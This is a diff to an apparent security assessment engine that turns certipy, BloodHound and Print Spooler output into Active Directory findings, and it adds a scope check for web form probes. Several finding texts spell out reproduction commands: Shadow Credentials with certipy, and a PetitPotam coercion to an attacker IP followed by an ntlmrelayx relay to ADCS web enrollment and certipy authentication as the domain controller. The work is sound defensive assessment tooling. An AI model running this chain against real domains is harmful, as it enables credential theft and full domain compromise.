@@ -4469,12 +4469,15 @@ export function certipyFindFindings(stdout) {
   if (!templates.length && !escUnique.length && !/Vulnerable Certificate Template/i.test(text)) {
     return [];
   }
-  const sev = escUnique.some((e) => /^ESC(1|4|8)$/i.test(e)) ? "Critical" : "High";
+  const sev = escUnique.some((e) => /^ESC(1|4|8|15)$/i.test(e)) ? "Critical" : "High";
+  const esc15Note = escUnique.some((e) => /^ESC15$/i.test(e))
+    ? " ESC15 (EKUwu, CVE-2024-49019) permite inyectar cualquier Application Policy (incluida Client Authentication) en un certificado emitido desde una plantilla con Schema Version 1, sin necesidad de enrollee-supplies-subject — vigente en CA con StrongCertificateBindingEnforcement no forzado (modo Compatibility)."
+    : "";
   return [{
     title: `AD: ADCS template(s) vulnerable(s)${escUnique.length ? ` (${escUnique.slice(0, 4).join(", ")})` : ""}`,
     severity: sev,
-    description: `certipy find -vulnerable -stdout detectó plantillas/ESC${templates.length ? `: ${templates.slice(0, 6).join(", ")}` : ""}${escUnique.length ? `. Clases: ${escUnique.join(", ")}` : ""}. Solo enumeración read-only; no se solicitó certificado abusivo.`,
-    remediation: "Auditar plantillas (enrollee supplies subject, overly permissive enrollment). Remediaciones ESC1–ESC8 según SpecterOps / Certified Pre-Owned. Restringir Enrollment Agents y managers.",
+    description: `certipy find -vulnerable -stdout detectó plantillas/ESC${templates.length ? `: ${templates.slice(0, 6).join(", ")}` : ""}${escUnique.length ? `. Clases: ${escUnique.join(", ")}` : ""}. Solo enumeración read-only; no se solicitó certificado abusivo.${esc15Note}`,
+    remediation: "Auditar plantillas (enrollee supplies subject, overly permissive enrollment). Remediaciones ESC1–ESC8 según SpecterOps / Certified Pre-Owned; para ESC15 forzar StrongCertificateBindingEnforcement=2 en la CA y auditar plantillas Schema Version 1. Restringir Enrollment Agents y managers.",
   }];
 }
 
@@ -4726,6 +4729,17 @@ const BLOODHOUND_ACE_LABEL = {
 };
 
 /**
+ * Sanitiza nombres de objetos AD (principal/target) para uso seguro en
+ * guidance text de comandos shell. Reemplaza caracteres que podrían
+ * escapar comillas o inyectar metacaracteres, manteniéndolos legibles.
+ */
+function sanitizeAdNameForShell(name) {
+  return String(name || "")
+    .replace(/'/g, "'\\''")  // single quote → close, escaped quote, open
+    .replace(/[`$;|&\n]/g, "");  // strip backtick, dollar, semicolon, pipe, ampersand, newline
+}
+
+/**
  * Parsea las líneas sintéticas "DS_ACE|principal|tipo|derecho|target|tipo"
  * que bridge.py anexa al stdout de bloodhound-python (extraídas de los JSON
  * ya escritos en evidence/bloodhound — la misma información que BloodHound
@@ -4749,7 +4763,9 @@ export function bloodhoundAceFindings(stdout) {
       description: isDcsync
         ? `BloodHound confirmó que ${principal} (${principalType}) tiene GetChanges Y GetChangesAll sobre el objeto dominio ${target} (CWE-269): con ambos derechos puede solicitar una réplica completa vía DRSUAPI (mimikatz lsadump::dcsync o secretsdump.py -just-dc), extrayendo los hashes NTLM de todos los usuarios del dominio, incluido krbtgt.`
         : right === "AddKeyCredentialLink"
-        ? `BloodHound confirmó que ${principal} (${principalType}) puede escribir msDS-KeyCredentialLink en ${target} (${targetType}) (CWE-269): permite añadir una clave pública propia como credencial alternativa del objeto (Shadow Credentials) y autenticar como ${target} vía PKINIT sin conocer su contraseña ni resetearla.`
+        ? `BloodHound confirmó que ${principal} (${principalType}) puede escribir msDS-KeyCredentialLink en ${target} (${targetType}) (CWE-269): permite añadir una clave pública propia como credencial alternativa del objeto (Shadow Credentials) y autenticar como ${target} vía PKINIT sin conocer su contraseña ni resetearla. Comando para reproducir manualmente (no se ejecutó — el motor solo detectó el ACE vía BloodHound):\n` +
+          `  1) certipy shadow auto -u '${sanitizeAdNameForShell(principal)}' -p '<PASSWORD>' -account '${sanitizeAdNameForShell(target)}' -dc-ip <DC_IP>\n` +
+          `  2) certipy auth -pfx '${sanitizeAdNameForShell(target)}.pfx' -dc-ip <DC_IP>`
         : `BloodHound confirmó que ${principal} (${principalType}) tiene el derecho ${right} sobre ${target} (${targetType}) (CWE-269), suficiente para tomar control del objeto (según el derecho: cambiar su contraseña, añadirlo a un grupo, modificar su ACL/propietario, o control total).`,
       remediation: isDcsync
         ? "Retirar GetChanges/GetChangesAll de cuentas que no sean controladores de dominio o cuentas de replicación legítimas (Azure AD Connect, etc.); auditar quién más los tiene."
@@ -5134,6 +5150,32 @@ export function spoolerFindings(stdout) {
 }
 
 /**
+ * Correlaciona dos señales de detección ya existentes (Print Spooler activo
+ * + plantilla ADCS vulnerable a ESC8) en una cadena de ataque completa:
+ * coerción de autenticación (PetitPotam/PrinterBug) -> relay NTLM al
+ * endpoint de web enrollment HTTP de la CA -> emisión de certificado ->
+ * autenticación como el DC coaccionado. Solo correlación de detecciones
+ * previas; no coacciona ni relaya nada. Requiere ambas señales presentes
+ * (cada una por separado ya genera su propio finding vía spoolerFindings/
+ * certipyFindFindings).
+ */
+export function coercionRelayEsc8Findings(spoolerStdout, certipyStdout) {
+  const spoolerActive = /Spooler service enabled|Spoolss|print spooler|Spooler is running/i.test(String(spoolerStdout || ""))
+    || (/\[\+\]/.test(String(spoolerStdout || "")) && /spooler/i.test(String(spoolerStdout || "")));
+  const esc8Present = /\bESC8\b/i.test(String(certipyStdout || ""));
+  if (!spoolerActive || !esc8Present) return [];
+  return [{
+    title: "AD: Coerción (PrinterBug/PetitPotam) + relay a ADCS ESC8 — cadena de ataque completa",
+    severity: "Critical",
+    description: "Print Spooler activo (superficie de coerción) Y una plantilla ADCS vulnerable a ESC8 (web enrollment HTTP sin protección de relay) coexisten en el mismo dominio (CWE-294): un atacante con acceso de red al segmento puede forzar al DC a autenticarse contra un listener propio y usar esa autenticación para emitir un certificado válido como el DC. Cadena para reproducir manualmente (no se ejecutó — el motor solo correlacionó dos detecciones read-only previas):\n" +
+      "  1) petitpotam.py -d <DOMAIN> '<USER>:<PASS>'@<DC_IP> <ATTACKER_IP>   (coacciona autenticación SMB del DC hacia el listener)\n" +
+      "  2) ntlmrelayx.py -t http://<CA_SERVER>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController   (relay al endpoint de enrollment web de la CA)\n" +
+      "  3) certipy auth -pfx <DC>.pfx -dc-ip <DC_IP>   (usa el certificado emitido para autenticar como el DC y extraer su NT hash)",
+    remediation: "Deshabilitar Print Spooler en DCs; forzar SMB signing en toda la red; deshabilitar web enrollment HTTP de la CA o forzar Extended Protection for Authentication (EPA) + HTTPS con channel binding en /certsrv; si no es posible, restringir ESC8 exigiendo mTLS o eliminando el enrollment endpoint HTTP.",
+  }];
+}
+
+/**
  * netexec -M laps: la cuenta de assessment puede leer LAPS.
  * No se incluyen contraseñas en el hallazgo — solo hosts afectados.
  */
@@ -5224,14 +5266,42 @@ export function buildFormBody(form, targetField, payload) {
     .join("&");
 }
 
-function formProbeSteps(step, prefix, baseUrl, form, cookieFile, payload, desc, maxTime) {
+/** Host normalizado (sin protocolo/puerto/www.) de una URL o string suelto. */
+function hostOf(value) {
+  const s = String(value || "").trim().toLowerCase();
+  const noScheme = s.replace(/^https?:\/\//i, "").split("/")[0].split("?")[0].split(":")[0];
+  return noScheme.startsWith("www.") ? noScheme.slice(4) : noScheme;
+}
+
+/**
+ * True si `candidateUrl` apunta al mismo host que `root` (o a un
+ * subdominio real de root). Usado para bloquear URLs ABSOLUTAS que el
+ * TARGET controla (form.action, login action) antes de mandarles
+ * payloads o credenciales del operador — sin esto, un target hostil con
+ * <form action="https://evil.example/x"> saca tráfico (y datos) fuera de
+ * scope. Fail-closed: root vacío o sin match -> false.
+ */
+export function hostInScope(candidateUrl, root) {
+  const c = hostOf(candidateUrl);
+  const r = hostOf(root);
+  if (!c || !r) return false;
+  return c === r || c.endsWith("." + r);
+}
+
+function formProbeSteps(step, prefix, baseUrl, form, cookieFile, payload, desc, maxTime, root) {
   const textFields = form.fields.filter((f) => f.type !== "checkbox" && f.type !== "radio");
+  // form.action puede ser una URL absoluta (form que postea a otro
+  // dominio/puerto) — concatenarla ciegamente con baseUrl produce una
+  // URL malformada.
+  const isAbsolute = /^https?:\/\//i.test(form.action);
+  const url = isAbsolute ? form.action : baseUrl + form.action;
+  if (isAbsolute && !hostInScope(url, root)) {
+    // El target controla form.action, no el playbook: una URL absoluta
+    // fuera de scope no recibe payloads del motor (fail-closed).
+    return [];
+  }
   return textFields.map((field) => {
     const body = buildFormBody(form, field.name, payload);
-    // form.action puede ser una URL absoluta (form que postea a otro
-    // dominio/puerto) — concatenarla ciegamente con baseUrl produce una
-    // URL malformada.
-    const url = /^https?:\/\//i.test(form.action) ? form.action : baseUrl + form.action;
     if (form.method === "GET") {
       const dataArgs = form.fields.flatMap((f) => [
         "--data-urlencode",
@@ -5251,12 +5321,12 @@ function formProbeSteps(step, prefix, baseUrl, form, cookieFile, payload, desc, 
   });
 }
 
-export function xssFormProbeSteps(step, prefix, baseUrl, form, cookieFile, maxTime = "12") {
-  return formProbeSteps(step, prefix, baseUrl, form, cookieFile, XSS_REFLECTION_PAYLOAD, "Sonda de XSS reflejado en formulario descubierto", maxTime);
+export function xssFormProbeSteps(step, prefix, baseUrl, form, cookieFile, maxTime = "12", root = "") {
+  return formProbeSteps(step, prefix, baseUrl, form, cookieFile, XSS_REFLECTION_PAYLOAD, "Sonda de XSS reflejado en formulario descubierto", maxTime, root);
 }
 
-export function sqliFormProbeSteps(step, prefix, baseUrl, form, cookieFile, maxTime = "12") {
-  return formProbeSteps(step, prefix, baseUrl, form, cookieFile, SQLI_GENERIC_PAYLOAD, "Sonda de SQLi genérico en formulario descubierto", maxTime);
+export function sqliFormProbeSteps(step, prefix, baseUrl, form, cookieFile, maxTime = "12", root = "") {
+  return formProbeSteps(step, prefix, baseUrl, form, cookieFile, SQLI_GENERIC_PAYLOAD, "Sonda de SQLi genérico en formulario descubierto", maxTime, root);
 }
 
 /* ------------------------------------------------------------------------ *
